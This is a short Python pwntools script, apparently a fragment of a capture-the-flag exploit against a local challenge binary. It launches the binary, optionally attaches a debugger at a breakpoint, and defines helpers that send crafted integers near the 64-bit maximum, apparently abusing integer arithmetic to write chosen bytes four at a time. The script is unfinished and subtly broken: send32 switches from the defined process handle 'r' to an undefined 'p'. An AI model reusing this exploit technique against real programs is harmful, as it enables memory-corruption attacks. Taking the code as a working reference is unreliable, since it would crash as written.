#!/usr/bin/env python

from pwn import *

GDB=args['GDB']

r=process("./b28b103ea5f1171553554f0127696a18c6d2dcf7")
context(arch="amd64",os="linux")

if GDB:
    gdb.attach(r,"""
               b *0x0401589
              """)

def send32(data):
    assert len(data)==4
    r.sendline("1")
    r.recvuntil(": ")
    p.sendline(str(0x7FFFFFFFFFFFFFFF-0xFFFF))
    p.recvuntil(": ")
    p.sendline(str(u32(data)+0xFFFF+1))

    p.recvuntil("=> ")

def send64(data):
    """Wrapper for 2 x send32()"""
    assert len(data) == 8
    send32(data[:4])
    send32(data[4:])

